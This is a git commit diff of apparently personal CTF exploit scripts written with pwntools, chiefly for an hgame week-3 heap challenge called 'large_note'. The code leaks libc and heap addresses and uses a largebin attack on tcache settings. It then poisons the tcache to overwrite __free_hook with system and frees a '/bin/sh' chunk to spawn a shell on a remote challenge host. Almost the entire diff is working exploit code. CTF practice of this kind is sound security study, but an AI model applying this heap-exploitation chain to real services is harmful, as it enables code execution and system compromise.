6549d12d8f1efc0f0cf49fc986c9a736461aab3f
wsl in minipc <752767115@qq.com>
2023-11-02 16:37:15 +0800

    largin_bin_attact & tcache_posioning 11.2 16:36

--- hgame_week/week3/large_note/large_note.py
+++ hgame_week/week3/large_note/large_note.py
@@ -1,24 +1,38 @@
 from pwn import * 
-from pwn import p64
+from pwn import p64,u64
 
 
 debug = 1
-gdb_is = 0
+gdb_is = 1
 # context(arch='i386',os = 'linux', log_level='DEBUG')
 context(arch='amd64',os = 'linux', log_level='DEBUG')
 if debug:
-    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
-    r = process("./vuln")
+    context.terminal = ['wt.exe','nt','Ubuntu','-c']
+    if gdb_is:
+        r = gdb.debug('./vuln','set debug-file-directory ./.debug/')
+        # gdb.attach(r,'b* 0x4012ed')
+        # gdb.attach(r)
+        # pause()
+        pass
+    else:
+        r = process("./vuln")
 else:
     host = "182.148.156.200"
     r = connect(host,9135)#远程连接
     gdb_is =0
 
-if gdb_is:
-    # gdb.attach(r,'b* 0x4012ed')
-    gdb.attach(r)
-    pause()
-    pass
+
+
+def show_addr(name,addr):
+      info(f'{name} = {hex(addr)}')
+
+def revc_addr(r:process,name, until=b'\x7f',offset = 0)->int:
+    if not offset:
+        addr = u64(r.recvuntil(until).ljust(8,b'\x00'))
+    else:
+        addr = u64(r.recvuntil(until)[:offset].ljust(8,b'\x00'))
+    show_addr(name,addr)
+    return addr
 
 
 
@@ -44,23 +58,67 @@ def show(page):
     r.sendlineafter(b'Index: ', str(page).encode())
 
 # size > 0x500
-add(0,0x500)
+add(0,0x728)
 add(1,0x500)
+add(2,0x718)
+add(3,0x500)
+
 delete(0)
-edit(0,b'a')
+edit(0,b'A')
 show(0)
-libc_addr = p64(r.recv(6).ljust(8,b'\x00')) -0x61 -0x1e3c00
-info('libc:'+hex(libc_addr))
-libc.address = libc_addr
-system_addr = libc.sym['system']
-free_hook = libc.sym['__free_hook']
-info('system_addr:'+hex(system_addr))
-info('free_hook :'+hex(free_hook))
+libc.address = revc_addr(r,'main_arena') - ord('A') - 0x1e3c00
+show_addr('libc.address',libc.address)
+edit(0,b'\x00')
 
+delete(2)
+show(2)
+heap_base = revc_addr(r,'heap',b'\n',-1) - 0x290
+show_addr('heap_base',heap_base)
 
-gdb.attach(r)
+add(0,0x728)
+add(2,0x718) 
+# 泄露完成 打largebins attack 改global_max_fast
+#注意大小差距不能太大 要在同一条bins链上
+global_max_fast_addr = libc.address + 0x1e6e98
+mp_tcachebins_addr = libc.address + 0x1e32d0
+delete(0)
+add(4,0x738)
+delete(2)
+
+show_addr('heap_base',heap_base)
+
+edit(0,p64(libc.address+0x1e40b0) + p64(libc.address+0x1e40b0)+ p64(heap_base+0x290) + p64(mp_tcachebins_addr - 0x20))
+show_addr('global_max_fast_addr',global_max_fast_addr)
+show_addr('mp_tcachebins_addr',mp_tcachebins_addr)
+add(5,0x738)
+delete(1)
+delete(3)
+delete(4)
+delete(5)
+# fastbin_ptr= libc.address + 0x1e3c00 + 8
+# idx=(libc.sym['__free_hook']-fastbin_ptr)/8
+# size=idx*0x10+0x20
+# show_addr('size',int(size))
+# size = 0x6490 size过大 直接global_max_fast改不了
+# 改完分配不了内存 malloc(): memory corruption (fast)
+#换tcachebins
+#打tcache_posioning
+add(10,0x900)
+add(11,0x900)
+delete(10)
+delete(11)
+# pause()
+xor_free_hook = libc.sym['__free_hook'] ^ ((heap_base + 0x3290)>> 12)
+edit(11,p64(xor_free_hook))
+add(13,0x900)
+add(14,0x900)
+rop = ROP(libc)
+
+rop.system()
+info(rop.dump())
+edit(14,rop.chain())
+edit(13,b'/bin/sh\x00')
+show_addr('__free_hook',libc.sym['__free_hook'])
 pause()
-# r.sendlineafter()
-# r.send()11wwwwwwwwwwwwwwwwwww
-# r.recvuntil()
+delete(13)
 r.interactive()
--- pwn_exp.py
+++ pwn_exp.py
@@ -9,18 +9,34 @@ elf_path = "./shellcode"
 context(arch='amd64',os = 'linux', log_level='DEBUG')
 if debug:
     context.terminal = ['wt.exe','nt','Ubuntu','-c']
-    if not gdb_is:
-        r = process(elf_path)
+    if gdb_is:
+        r = gdb.debug('./vuln','set debug-file-directory ./.debug/')
+        # gdb.attach(r,'b* 0x4012ed')
+        # gdb.attach(r)
+        # pause()
+        pass
+    else:
+        r = process("./vuln")
     
 else:
     host = "192.168.0.111:53783"
     r = connect(host.split(':')[0],host.split(':')[1])#远程连接
     gdb_is =0
 
-if gdb_is:
-    r = gdb.debug(elf_path)
-    # pause()
-    pass
+
+
+def show_addr(name,addr):
+      info(f'{name} = {hex(addr)}')
+
+def revc_addr(r:process,name, until=b'\x7f',offset = 0)->int:
+    if not offset:
+        addr = u64(r.recvuntil(until).ljust(8,b'\x00'))
+    else:
+        addr = u64(r.recvuntil(until)[:offset].ljust(8,b'\x00'))
+    show_addr(name,addr)
+    return addr
+    
+
 
 elf = ELF(elf_path)
 rop = ROP(elf)
